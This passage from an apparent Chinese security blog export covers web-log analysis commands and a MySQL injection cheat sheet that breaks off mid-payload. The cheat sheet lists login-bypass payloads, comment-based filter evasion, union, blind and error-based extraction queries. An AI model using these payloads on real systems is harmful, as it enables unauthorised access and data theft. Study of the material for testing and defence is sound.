class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html</span><br></pre></td></tr></table></figure><blockquote><p>这里输出路径开了kali2021，Apache服务。</p><p><code>-p</code>：指定要使用的自定义配置文件</p><p><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</p></blockquote><p><strong>动态：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html --real-time-html</span><br></pre></td></tr></table></figure><blockquote><p>生成实时 HTML 报告的过程和生成静态报告的过程非常相似。实时报告仅仅需要使用参数 <code>--real-time-html</code></p></blockquote><p><strong>输出结果：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820183543494.png" alt="image-20210820183543494"></p><h3 id="Linux-命令分析"><a href="#Linux-命令分析" class="headerlink" title="Linux 命令分析"></a>Linux 命令分析</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>xargs</code>命令的作用，是将标准输入转为命令行参数。</p><p>具体用法详见：<a href="https://www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html">xargs 命令教程</a></p><p><code>cut</code>命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p><ul><li>-d ：自定义分隔符，默认为制表符。</li><li>-f ：与-d一起使用，指定显示哪个区域。</li></ul><p><code>sort</code>将文本文件内容加以排序。</p><ul><li>[-k field1[,field2]] 按指定的列进行排序。</li><li>-r 以相反的顺序来排序。</li></ul><p><code>uniq</code>用于检查及删除文本文件中重复出现的行列</p><p>-c或–count 在每列旁边显示该行重复出现的次数。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210823193719130.png" alt="image-20210823193719130"></p><p><code>wc</code>将计算指定文件的行数、字数，以及字节数</p><ul><li>-l或–lines 显示行数。</li></ul><p>定位具体的IP地址或文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find . access.log | xargs grep &quot;ip&quot;</span><br><span class="line">find . access.log | xargs grep &quot;filename&quot;</span><br></pre></td></tr></table></figure><blockquote><p>查找文件名包含<code>access.log</code>以后，对每个文件搜索一次是否包含字符串的内容</p><p>顺便一说：奇安信的《网络安全应急响应》这里好像写错了</p></blockquote><h4 id="IP驱动"><a href="#IP驱动" class="headerlink" title="IP驱动"></a>IP驱动</h4><p>查看访问次数最多的前10个IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat oa.access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -rn |head -10</span><br></pre></td></tr></table></figure><blockquote><p>先把IP字段提取出来，去重排列，计数根据计数结果也就是第一列排序。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210823195053834.png" alt="image-20210823195053834"></p><blockquote><p>顺便再一说：奇安信的《网络安全应急响应》这里少了个<code>n</code>参数。</p></blockquote><p>查看每一个IP访问量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; oa.access.log</span><br></pre></td></tr></table></figure><p>查看特定的ip访问的url</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep ^127.0.0.1 oa.access.log| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br></pre></td></tr></table></figure><h4 id="时间驱动"><a href="#时间驱动" class="headerlink" title="时间驱动"></a>时间驱动</h4><p>查看xxx时间点这一个小时内IP访问量:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; oa.access.log | grep 23/Aug/2021:15 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h4 id="目的驱动-访问的url等"><a href="#目的驱动-访问的url等" class="headerlink" title="目的驱动(访问的url等)"></a>目的驱动(访问的url等)</h4><p>去掉搜索引擎统计当天的页面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; oa.access.log | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq| wc -l</span><br></pre></td></tr></table></figure><p>统计日志文件中的爬虫</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#x27;Googlebot|Baiduspider&#x27; log_file | awk &#x27;&#123; print $1 &#125;&#x27; | sort | uniq</span><br></pre></td></tr></table></figure><p>统计相关扫描器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file | grep -v -E &#x27;python|java|awvs&#x27; | sort | uniq -c | sort -r -n | head -n 100</span><br></pre></td></tr></table></figure><p>统计HTTP状态码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file |awk &#x27;&#123;print $9&#125;&#x27;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>访问URL统计</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file |awk &#x27;&#123;print $7&#125;&#x27;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file | awk &#x27;&#123;print $7&#125;&#x27; | egrep &#x27;\?|&amp;&#x27; | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/pRhyqvdMqMAlc5NVihwZtw">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sysmon</title>
      <link href="/p/bef03572.html"/>
      <url>/p/bef03572.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4d95e94613726b0410d6fa18df55c8d284fa876c51ac802add5b3f89dceafc5b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全事件监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入</title>
      <link href="/p/7d3b4823.html"/>
      <url>/p/7d3b4823.html</url>
      
        <content type="html"><![CDATA[<h2 id="information-schema数据库三张表"><a href="#information-schema数据库三张表" class="headerlink" title="information_schema数据库三张表"></a>information_schema数据库三张表</h2><h3 id="information-schema-schemata"><a href="#information-schema-schemata" class="headerlink" title="information_schema.schemata"></a>information_schema.schemata</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据库的库名</p></blockquote><p> <img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426488028-61a016bc-8ffc-4fee-a011-250bde7061f4.png" alt="image.png"></p><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据表的表名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426528926-8cf88db6-5c5a-4fa6-9bb0-351ac7e6390b.png" alt="image.png"></p><h3 id="information-schema-columns"><a href="#information-schema-columns" class="headerlink" title="information_schema.columns"></a>information_schema.columns</h3><blockquote><p>该数据表存储了mysql数据库中的所有列的列名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426541299-0d3a9e82-2f80-40e4-8db4-14a8e5844a46.png" alt="image.png"></p><span id="more"></span><h2 id="常见注入参数"><a href="#常见注入参数" class="headerlink" title="常见注入参数"></a>常见注入参数</h2><table><thead><tr><th>参数</th><th>释义</th></tr></thead><tbody><tr><td>user()</td><td>当前数据库用户</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>version()</td><td>当前使用数据库版本</td></tr><tr><td>@@datadir</td><td>数据库<strong>存储数据路径</strong></td></tr><tr><td>concat()</td><td><strong>联合数据</strong>，用于联合两条数据结果。如 concat(username,0x3a,password)</td></tr><tr><td>group_concat()</td><td>group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来</td></tr><tr><td>concat_ws()</td><td>用法类似</td></tr><tr><td>hex() &amp; unhex()</td><td>用于 <strong>hex</strong> 编码解码</td></tr><tr><td>ascii(str)</td><td>返回给定字符的<strong>ascii值</strong>，如果str是空字符串，返回0</td></tr><tr><td>length(str)</td><td>返回给定<strong>字符串的长度</strong>，如  length(“string”)=6</td></tr><tr><td>substr(string,start,length)</td><td>对于给定字符串string，从start位开始<strong>截取</strong>，截取length长度</td></tr><tr><td>load_file()</td><td>以文本方式<strong>读取文件</strong>，在 Windows 中，路径设置为 \</td></tr><tr><td>substr()、substring()、mid()</td><td>三个函数的用法、功能均一致</td></tr><tr><td>select xxoo into outfile ‘路径’</td><td>权限较高时可直接<strong>写文件</strong></td></tr><tr><td>CHAR()</td><td>把整数转换为对应的字符</td></tr></tbody></table><h2 id="Mysql中注释"><a href="#Mysql中注释" class="headerlink" title="Mysql中注释"></a>Mysql中注释</h2><p><strong>单行注释：</strong><code>#</code> &amp; <code>-</code></p><p><strong>多行注释，可以实现行内注释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*注释内容*/</span><br><span class="line">DROP/*comment*/sampletable</span><br><span class="line">DR/**/OP/*绕过过滤*/sampletable  </span><br><span class="line">SELECT/*替换空格*/password/**/FROM/**/Members</span><br></pre></td></tr></table></figure><p><code>/* */</code>这种注释方式还有一种扩展，即当在注释中使用！加上版本号时，只要mysql的当前版本<strong>等于或大于</strong>该版本号，则该注释中的sql语句将被mysql执行。这种方式只适用于mysql数据库。不具有其他数据库的可移植性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27/**//*!12440UNION*//**//*!12440SELECT*/1111,2222,3333%23 HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="后台万能密码"><a href="#后台万能密码" class="headerlink" title="后台万能密码"></a>后台万能密码</h2><h3 id="输入点在用户名"><a href="#输入点在用户名" class="headerlink" title="输入点在用户名"></a>输入点在用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">admin&#x27;</span> #</span><br><span class="line">admin<span class="string">&#x27;/*</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- </span></span><br><span class="line"><span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x27;) or &#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">&#x27;) or (&#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">以不同的用户登陆 &#x27; UNION SELECT 1, &#x27;anotheruser&#x27;, &#x27;doesnt matter&#x27;, 1--</span></span><br></pre></td></tr></table></figure><h3 id="输入点在密码"><a href="#输入点在密码" class="headerlink" title="输入点在密码"></a>输入点在密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or 1%23</span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span>(<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p><strong>schema_name  –&gt; schemata</strong><br><strong>table_name –&gt; tables</strong><br><strong>column_name –&gt; columns</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断当前表的字段数量</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;order by 3#</span></span><br><span class="line"><span class="string">3正确4报错就有字段数为3</span></span><br><span class="line"><span class="string">通过union联合查询来知道回显字段的位置</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">注：设置id<span class="operator">=</span><span class="number">-1</span> 这样数据库中没有id<span class="operator">=</span><span class="number">-1</span>的数据，所以就会返回<span class="keyword">union</span> <span class="keyword">select</span>的结果</span><br><span class="line">使用mysql内置函数获取信息</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span></span><br><span class="line">获得所有的数据库</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata#</span><br><span class="line">kuming数据库的所有表</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> </span><br><span class="line">kuming数据库中biaoming表中的所有列</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;biaoming&#x27;</span> </span><br><span class="line">biaoming表中，三列数据的所有内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(lieming1,<span class="string">&#x27;--&#x27;</span>,lieming2,<span class="string">&#x27;--&#x27;</span>,lieming3),<span class="number">3</span> <span class="keyword">from</span> biaoming</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> lieming1 <span class="keyword">from</span> kuming.biaoming limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="left-a-b"><a href="#left-a-b" class="headerlink" title="left(a)=b"></a>left(a)=b</h4><blockquote><p>sql的left()函数如果式子成立返回1如果不成立返回 0</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821183018114.png" alt="image-20210821183018114"></p><h4 id="mid-s-n-len"><a href="#mid-s-n-len" class="headerlink" title="mid(s,n,len)"></a>mid(s,n,len)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or ((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;65)--+</span></span><br></pre></td></tr></table></figure><blockquote><p>注：从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)。注意字符串从1开始，而非0，Length是可选项，如果没有提供，<code>MID()</code>函数将返回余下的字符串。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821220656380.png" alt="image-20210821220656380"></p><h3 id="构造MySQL报错即可配合if函数进行盲注"><a href="#构造MySQL报错即可配合if函数进行盲注" class="headerlink" title="构造MySQL报错即可配合if函数进行盲注"></a>构造MySQL报错即可配合<code>if</code>函数进行盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>),<span class="number">1</span>,<span class="built_in">power</span>(<span class="number">9999</span>,<span class="number">99</span>)) # 当字符相等时，不报错，错误时报错</span><br></pre></td></tr></table></figure><h3 id="判断当前数据库名"><a href="#判断当前数据库名" class="headerlink" title="判断当前数据库名"></a>判断当前数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断数据库长度</span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span><span class="comment">--+</span></span><br><span class="line">判断数据库字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>  ##二分法</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>  ##爆破法</span><br></pre></td></tr></table></figure><blockquote><p>以上方法不适用于access和SQL Server数据库</p></blockquote><h3 id="判断当前数据库中的表"><a href="#判断当前数据库中的表" class="headerlink" title="判断当前数据库中的表"></a>判断当前数据库中的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜测当前数据库是否存在xxxxx表</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> xxxxx)</span><br><span class="line">判断当前数据库中表的个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">4</span></span><br><span class="line">判断每个表的长度</span><br><span class="line">判断第一张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断第二张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断每个表的每个字符的ASCII值</span><br><span class="line">第一个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第一个表第二个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第二个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> username <span class="keyword">from</span> admin)</span><br><span class="line">判断表中字段个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的长度</span><br><span class="line">判断第一个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断第二个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的ascii值</span><br><span class="line">判断第一个字段的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第一个字段的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第二个字段的第一个字符的长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断字段中的数据"><a href="#判断字段中的数据" class="headerlink" title="判断字段中的数据"></a>判断字段中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断数据的长度</span><br><span class="line">判断id字段的第一个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断id字段的第二个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断数据的ASCII值</span><br><span class="line">判断id字段的第一个数据的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断id字段的第一个数据的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="报错注入-过滤空格"><a href="#报错注入-过滤空格" class="headerlink" title="报错注入(过滤空格)"></a>报错注入(过滤空格)</h2><p><code>select/insert/update/delete</code>都可以使用报错来获取信息。</p><h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><strong>EXTRACTVALUE (XML_document, XPath_string)</strong></p><p>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称.</p><p>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串).</p><p>作用：从目标 XML 中返回包含所查询值的字符串.</p><mark class="hl-label orange">注意:</mark>  返回结果 限制在32位字符.<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="UpdateXml报错注入"><a href="#UpdateXml报错注入" class="headerlink" title="UpdateXml报错注入"></a>UpdateXml报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><strong>UPDATEXML (XML_document, XPath_string, new_value)</strong><br>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1<br>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串)<br>第三个参数：<code>new_value</code>，String 格式，替换查找到的符合条件的数据</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,version,<span class="number">0</span>)#</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> 